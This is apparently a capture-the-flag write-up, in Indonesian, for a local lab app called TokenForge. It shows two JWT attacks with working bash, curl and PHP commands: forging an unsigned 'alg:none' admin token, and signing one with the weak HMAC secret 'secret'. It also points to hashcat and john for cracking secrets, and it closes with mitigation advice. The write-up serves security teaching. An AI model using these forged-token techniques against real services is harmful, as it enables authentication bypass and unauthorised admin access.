# WRITEUP · 07 TokenForge (SPOILER)

## 1. Pahami token

Login (password `letmein`). Token yang di-set berbentuk:

```
<header>.<payload>.<signature>     (masing-masing base64url)
```

Decode payload:

```bash
echo '<payload>' | tr '_-' '/+' | base64 -d
# {"user":"guest","role":"user"}
```

Target: `role` = `admin`.

## 2. Jalur A — alg:none (paling mudah)

Buat token tanpa tanda tangan. Header `{"alg":"none"}`, payload role admin,
signature kosong (titik terakhir tetap ada):

```bash
h=$(printf '{"alg":"none"}'                 | base64 | tr '+/' '-_' | tr -d '=')
p=$(printf '{"user":"x","role":"admin"}'    | base64 | tr '+/' '-_' | tr -d '=')
TOK="$h.$p."
curl -s -b "token=$TOK" http://127.0.0.1:9007/ | grep -o 'FLAG{[^}]*}'
```

Server menerimanya karena verifier mengembalikan payload begitu saja saat
`alg === 'none'`.

## 3. Jalur B — secret HMAC lemah

Kalau alg:none ditutup, pecahkan secret-nya. Secret di sini = `secret`.

Dengan secret diketahui, tandatangani token HS256 sendiri:

```bash
php -r '
function b($d){return rtrim(strtr(base64_encode($d),"+/","-_"),"=");}
$h=b(json_encode(["alg"=>"HS256","typ"=>"JWT"]));
$p=b(json_encode(["user"=>"x","role"=>"admin"]));
$s=b(hash_hmac("sha256","$h.$p","secret",true));
echo "$h.$p.$s\n";'
# pakai hasilnya sebagai cookie token
```

(Untuk meng-crack secret sungguhan dari sebuah token: `hashcat -m 16500 token.txt wordlist`
atau `john`.)

## 4. Pelajaran & mitigasi

- **Tolak `alg:none`** dan jangan biarkan token menentukan algoritmanya. Tetapkan
  algoritma yang diharapkan di sisi server.
- **Secret HMAC harus panjang & acak** (≥256-bit). Secret lemah bisa di-crack
  offline dari satu token saja.
- Gunakan library JWT yang teruji, verifikasi `exp`, `aud`, `iss`, dan simpan data
  otorisasi penting di server bila memungkinkan.
